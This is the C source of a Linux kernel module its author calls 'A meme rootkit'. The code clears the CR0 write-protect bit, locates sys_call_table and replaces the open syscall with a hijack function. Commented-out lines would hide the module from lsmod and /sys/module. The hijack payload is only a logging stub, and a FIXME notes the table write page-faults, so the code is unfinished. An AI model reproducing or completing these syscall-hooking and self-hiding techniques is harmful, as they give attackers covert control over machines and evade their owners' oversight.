#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/moduleparam.h>
#include <linux/unistd.h> 
#include <linux/syscalls.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Jason Turley");
MODULE_DESCRIPTION("A meme rootkit.");

static char *memefile;
static unsigned long **sys_call_table;

module_param(memefile, charp, 0);
MODULE_PARM_DESC(memefile, "file path to the meme.");

/*
 * Since Linux kernel version 5.0+, we can no longer edit the control register, cr0 with
 * the write_cr0 macro. However, we can use inline assembly to edit the register directly.
 *
 * credit: 
 *	- https://www.linkedin.com/pulse/changing-wp-bit-cr0-registerkernel-50-yash-kumar
 * 	- https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=8dbec27a242cd3e2816eeb98d3237b9f57cf6232
 */
static inline void overwrite_cr0(unsigned long val)
{
	asm volatile ("mov %0, %%cr0": "+r" (val));
}

/*
 * Disables the Write Protected (read only) bit in the control register, cr0.
 * 
 * We need to disable it in order to overwrite to the system call table at
 * runtime.
 *
 * Preemption is disabled to prevent the CPU scheduler from offloading our
 * task to another core while it is running.
 */
static void disable_write_protected_bit(void)
{
	preempt_disable();
	overwrite_cr0(read_cr0() & (~ 0x10000));
}

/*
 * Enables the Write Protected (read only) bit in the control register, cr0.
 *
 * We need to reenable it after our exploit/hijack is complete.
 *
 * Also turn preemption back on for the CPU scheduler.
 */
static void enable_write_protected_bit(void)
{
	overwrite_cr0(read_cr0() | 0x10000);
	preempt_enable();
}

/* Save a copy of the original open system call */
asmlinkage int (*original_open)(const char *pathname, int flags, mode_t mode);

/* 
 * meme_open: the hijacked open system call that will open the memefile instead of
 * the intended PNG file. 
 */
asmlinkage int meme_open(const char *pathname, int flags, mode_t mode)
{
	/* TODO: implement me. Currently just stub code for debugging */
	printk(KERN_DEBUG  "memekit: inside meme_open\n");
	return original_open(pathname, flags, mode);
}

static int __init memekit_init(void)
{
	/* Uncomment to hide our rootkit from /proc/modules, /sys/module, and lsmod */
	/* WARNING: rmmod won't be able to find and remove the rootkit */
	//list_del_init(&__this_module.list);
	//kobject_del(&THIS_MODULE->mkobj.kobj);

	printk(KERN_DEBUG "memekit: module loaded!\n");

	sys_call_table = (void *) kallsyms_lookup_name("sys_call_table");
	
	if (sys_call_table == NULL) {
		printk(KERN_ERR "memekit: failed to find sys_call_table. Exiting\n");
		return -1;
	}

	printk(KERN_DEBUG "memekit: found sys_call_table at address %lx\n", (unsigned long)sys_call_table);

   	/* Disable write protect so we can overwrite the syscall table */
	disable_write_protected_bit();
	
	/* Hijack the legit open system call with our meme open function */
	original_open = (int(*)(const char *, int, mode_t))sys_call_table[__NR_open]; 
	
	/* FIXME: currently, writing to the sys_call_table causes a page fault. In past commits I marked 
	 * the table as read-write, but it still generated a page fault :( */
	sys_call_table[__NR_open] = (void *) meme_open;
	
	printk(KERN_DEBUG "memekit: original_open at address %lx\n", (unsigned long)original_open);

	return 0;
}

static void __exit memekit_exit(void)
{
	/* Restore the original open system call */
	sys_call_table[__NR_open] = (void *) original_open;

	/* Re-enable the write protect bit */
	enable_write_protected_bit();

	printk(KERN_DEBUG  "memekit: module unloaded!\n");
}

module_init(memekit_init);
module_exit(memekit_exit);
